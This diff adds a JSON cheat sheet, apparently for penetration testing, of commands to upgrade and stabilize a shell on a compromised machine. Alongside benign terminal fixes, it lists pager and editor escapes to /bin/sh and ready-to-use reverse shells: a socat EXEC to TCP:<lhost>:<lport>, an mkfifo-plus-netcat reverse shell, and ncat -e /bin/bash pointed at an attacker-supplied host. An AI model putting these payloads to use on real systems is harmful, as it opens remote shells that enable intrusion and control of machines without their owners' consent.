@@ -1,0 +1,48 @@
+{
+  "PTY_TTY": {
+    "Upgrade_From_Shell": {
+      "Bash Interactive": "bash -i",
+      "Sh Interactive": "sh -i",
+      "Python3 PTY": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "Python2 PTY": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "Script PTY (no python)": "script -qc /bin/bash /dev/null",
+      "Perl PTY": "perl -e 'exec \"/bin/bash\";'",
+      "Ruby PTY": "ruby -e 'exec \"/bin/bash\"'",
+      "Lua PTY": "lua -e 'os.execute(\"/bin/bash\")'",
+      "BusyBox Sh": "busybox sh"
+    },
+    "Stabilize_Local_Term": {
+      "Background Shell": "Ctrl+Z",
+      "Raw Echo Off": "stty raw -echo; fg",
+      "Export TERM": "export TERM=xterm-256color",
+      "Reset Line Settings": "stty sane",
+      "Fix Rows/Cols": "stty rows <rows> cols <cols>"
+    },
+    "History_LineEditing": {
+      "Enable Job Control": "set -m",
+      "Attach Readline (rlwrap)": "rlwrap -cArS '$ ' -m bash",
+      "Bind Arrows (if bare sh)": "set -o emacs"
+    },
+    "Pager_Editor_Escapes": {
+      "Vi/Vim Shell": "vim -c ':set shell=/bin/bash' -c ':shell'",
+      "More/Less Shell": "LESSOPEN=1 less /etc/hosts  # then !/bin/sh",
+      "Man Shell": "man man  # then !/bin/sh",
+      "Awk Exec": "awk 'BEGIN {system(\"/bin/bash\")}'",
+      "Find Exec": "find . -exec /bin/sh \\; -quit"
+    },
+    "Socat_PTY": {
+      "Listener (PTY)": "socat -d -d TCP-LISTEN:<lport>,reuseaddr,fork FILE:`tty`,raw,echo=0",
+      "Reverse (PTY)": "socat -d -d EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:<lhost>:<lport>"
+    },
+    "Netcat_Tricks": {
+      "mkfifo Reverse (POSIX)": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <lhost> <lport> > /tmp/f",
+      "ncat Exec (if available)": "ncat <lhost> <lport> -e /bin/bash"
+    },
+    "Terminal_Fixes": {
+      "Check Stty": "stty -a",
+      "Reset Terminal": "reset",
+      "Fix Backspace/Arrows": "stty intr ^C erase ^? kill ^U",
+      "Locale Quiet": "export LC_ALL=C LANG=C"
+    }
+  }
+}
